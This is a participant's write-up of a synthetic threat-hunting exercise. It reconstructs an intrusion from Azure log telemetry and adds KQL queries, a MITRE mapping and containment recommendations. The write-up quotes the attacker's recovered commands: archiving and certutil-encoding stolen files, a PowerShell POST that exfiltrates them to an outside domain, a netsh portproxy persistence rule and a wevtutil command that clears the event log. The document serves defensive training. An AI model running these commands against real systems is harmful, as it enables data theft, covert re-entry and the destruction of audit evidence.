# Silent Corridor — Incident Investigation Report

**Prepared by:** Samuel Jackson
**Context:** LOG(N) Pacific weekly threat-hunt challenge (participant write-up)
**Environment:** LAW-SilentCorridor / Azure Log Analytics
**Classification:** Training scenario / portfolio write-up

> **Lab scope:** all hosts, accounts and domains in this report are synthetic and
> belong to the LOG(N) Pacific Silent Corridor training scenario. This is not a real
> incident.

## Executive Summary

This report documents my findings from the Silent Corridor threat-hunt challenge.
Working through the scenario's telemetry, I reconstructed the attacker's behaviour
from initial access through credential theft, reconnaissance, lateral movement,
persistence, exfiltration and anti-forensics.

The hunt relied on Azure Log Analytics, Kusto Query Language (KQL), Sysmon
telemetry, process command-line analysis and correlation of evidence across
multiple hosts and accounts.

The hunt confirmed:

- Compromise of multiple systems and user accounts
- Credential theft and credential reuse
- WMIC-based remote execution
- RDP-based lateral movement
- Access to sensitive Active Directory data, including ntds.dit
- Compression and encoding of staged files
- External data exfiltration via PowerShell Invoke-WebRequest
- Persistence through portproxy configuration
- Event log clearing and other anti-forensics activity

## Methodology

1. Establish initial access indicators
2. Identify suspicious authentication behaviour
3. Trace attacker reconnaissance activity
4. Investigate credential access attempts
5. Correlate lateral movement activity
6. Investigate persistence mechanisms
7. Identify file staging and exfiltration behaviour
8. Analyse cleanup and anti-forensics actions
9. Produce containment recommendations and findings

## Investigation Narrative

### Phase 1 – Initial Access

The hunt began with suspicious authentication activity, which was eventually
linked to the account **s.brandt**. Authentication telemetry indicated that
compromised credentials were used to establish an initial foothold.

**WS-ENG04** was identified as the beachhead workstation and became a central pivot
point throughout the intrusion.

### Phase 2 – Reconnaissance and Discovery

After initial access, the attacker gathered information about the internal
environment: directory enumeration, host discovery, internal network
reconnaissance, and process and system information gathering.

```kql
SilentCorridorX_CL
| where ProcessCommandLine has "systeminfo"
| project TimeGenerated, DeviceName, ProcessCommandLine
```

### Phase 3 – Credential Access

There was strong evidence of credential-focused behaviour: credential dumping,
access to stored credentials, and credential reuse.

The account **m.richter** was confirmed compromised and was heavily associated with
WMIC remote execution, file staging, archive creation and cleanup.

### Phase 4 – Lateral Movement

The attacker used WMIC remote execution, cross-host process spawning and RDP to move
between **WS-ENG04**, **SRV-FILES02** and **SRV-DC01**.

On the receiving side, `WmiPrvSE.exe` was the parent process of the remotely
executed commands.

### Phase 5 – Sensitive Data Access and Collection

The attacker targeted ntds.dit, file-server staging locations and engineering
directories. Key staging locations:

- `C:\Windows\Temp\McAfee_Logs`
- `C:\Engineering\Avionics\A400M_NavSys`

### Phase 6 – Compression and Encoding

The collected files were compressed with PowerShell `Compress-Archive`:

```powershell
powershell Compress-Archive -Path C:\Engineering\Avionics\A400M_NavSys\* -DestinationPath C:\Windows\Temp\win_update_kb5034.zip -Force
```

The archive was then Base64-encoded with certutil:

```
certutil -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64
```

### Phase 7 – Exfiltration

Outbound transfer consistent with successful exfiltration (confidence: **High**):

```powershell
powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64"
```

External destination: `cdn-telemetry.cloud-endpoint.net`

### Phase 8 – Persistence and Re-entry

Persistence used a Windows portproxy rule forwarding port 8443 to SMB on the domain
controller:

```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local
```

The attacker returned approximately two days after the initial exfiltration.

### Phase 9 – Cleanup and Anti-Forensics

The attacker cleared the Security event log:

```
wevtutil cl Security
```

Cleanup also included WMIC remote cleanup, deletion of staging artefacts from
SRV-DC01 and removal of temporary files. Despite this, Sysmon telemetry preserved
the critical evidence.

## Attack Timeline (order of events)

Initial access → Reconnaissance → Credential access → Lateral movement →
Collection → Compression → Encoding → Exfiltration → Persistence → Cleanup

## Indicators of Compromise

See [../iocs.md](../iocs.md) for the full, typed IOC list.

## MITRE ATT&CK Mapping

| Technique | Name |
|---|---|
| T1078 | Valid Accounts |
| T1003 | OS Credential Dumping |
| T1047 | Windows Management Instrumentation |
| T1021 | Remote Services (RDP) |
| T1560 | Archive Collected Data |
| T1041 | Exfiltration Over C2 Channel |
| T1090 | Proxy |
| T1070 | Indicator Removal |

## Severity and Risk Assessment

**Critical:** credential compromise · domain controller access · access to ntds.dit ·
external exfiltration

**High:** portproxy persistence · event log clearing · WMIC lateral movement

## Containment Recommendations

These are the actions the findings point to; the challenge did not include carrying
them out.

1. Disable and reset **s.brandt** and **m.richter**; because ntds.dit was accessed,
   treat all domain credentials as exposed (including a double krbtgt reset).
2. Isolate WS-ENG04, SRV-FILES02 and SRV-DC01 for investigation.
3. Remove the portproxy rule on 8443 and block the port.
4. Block `cdn-telemetry.cloud-endpoint.net` at the proxy and firewall.
5. Hunt across the estate for the other IOCs before declaring the incident closed.

## Detection Engineering Opportunities

- Detect wevtutil log clearing
- Detect certutil -encode activity
- Detect WMIC remote execution
- Detect Invoke-WebRequest POST behaviour
- Detect portproxy configuration changes
- Detect suspicious Compress-Archive activity

These are written up as detections in
[kql-detection-library](https://github.com/SamJ-01/kql-detection-library).

## Lessons Learned

- Layered telemetry is critical: Sysmon telemetry survived the anti-forensics.
- LOLBins (PowerShell, certutil, WMIC, netsh) remain highly effective for attackers
  and need monitoring.
- Credential reuse creates major enterprise risk.
- Centralised logging significantly improves incident response.

## What I Personally Did

- Used KQL hunting queries to find each stage of the attack
- Correlated Sysmon telemetry across multiple systems
- Investigated the persistence mechanism
- Tracked WMIC and RDP lateral movement
- Investigated the exfiltration behaviour
- Analysed the anti-forensics activity
- Wrote up the findings and recommendations in this report
